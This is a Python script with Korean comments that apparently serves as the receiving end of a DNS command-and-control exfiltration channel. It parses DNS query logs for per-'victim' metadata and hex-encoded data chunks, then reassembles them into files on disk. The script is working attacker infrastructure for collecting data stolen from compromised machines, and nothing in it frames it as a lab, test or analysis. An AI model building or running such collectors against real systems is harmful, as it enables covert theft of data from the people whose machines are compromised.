import re
import os
import base64
import logging

# 로깅 설정
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

def extract_chunks(log_file, chunks_dir):
    # 피해자별 데이터 저장
    victims = {}
    meta_pattern = re.compile(r"메타데이터 저장: (\w+), 총 청크: (\d+)")
    chunk_pattern = re.compile(r"청크 디코딩: (\w+), 원문: \"(.*?)\".*바이트: ([0-9a-f]+)")
    chunk_idx_pattern = re.compile(r"저장된 청크: (\w+)/(\d+)")
    
    with open(log_file, "r", encoding="utf-8") as f:
        for line in f:
            # 메타데이터
            meta_match = meta_pattern.search(line)
            if meta_match:
                victim, total = meta_match.group(1), meta_match.group(2)
                if victim not in victims:
                    victims[victim] = {"meta": None, "chunks": {}, "total": 0}
                victims[victim]["meta"] = f"total:{total}".encode()
                victims[victim]["total"] = int(total)
                logging.info(f"Found meta for {victim}: total={total}")
                continue
            # 청크
            chunk_match = chunk_pattern.search(line)
            idx_match = chunk_idx_pattern.search(line)
            if chunk_match and idx_match:
                victim, idx = chunk_match.group(1), int(idx_match.group(2))
                chunk_data = bytes.fromhex(chunk_match.group(3))  # 로그의 바이트 사용
                if victim not in victims:
                    victims[victim] = {"meta": None, "chunks": {}, "total": 0}
                victims[victim]["chunks"][idx] = chunk_data
                logging.info(f"Found chunk {idx} for {victim}, length={len(chunk_data)}")
    
    # 디스크에 저장
    for victim, data in victims.items():
        victim_dir = os.path.join(chunks_dir, victim)
        os.makedirs(victim_dir, exist_ok=True)
        
        # 메타데이터 저장
        if data["meta"]:
            meta_path = os.path.join(victim_dir, "meta.bin")
            with open(meta_path, "wb") as f:
                f.write(data["meta"])
            logging.info(f"Saved {meta_path}")
        
        # 청크 저장
        for idx, chunk_data in data["chunks"].items():
            chunk_path = os.path.join(victim_dir, f"chunk{idx}.bin")
            with open(chunk_path, "wb") as f:
                f.write(chunk_data)
            logging.info(f"Saved {chunk_path}")
        
        # 청크 수 확인
        if len(data["chunks"]) < data["total"]:
            logging.warning(f"Missing chunks for {victim}: expected {data['total']}, got {len(data['chunks'])}")
    
    return victims

if __name__ == "__main__":
    log_file = "/dns-c2/logs/raw/dns_query.log"
    chunks_dir = "/dns-c2/chunks"
    
    if not os.path.exists(log_file):
        logging.error(f"Log file {log_file} not found")
    else:
        extract_chunks(log_file, chunks_dir)
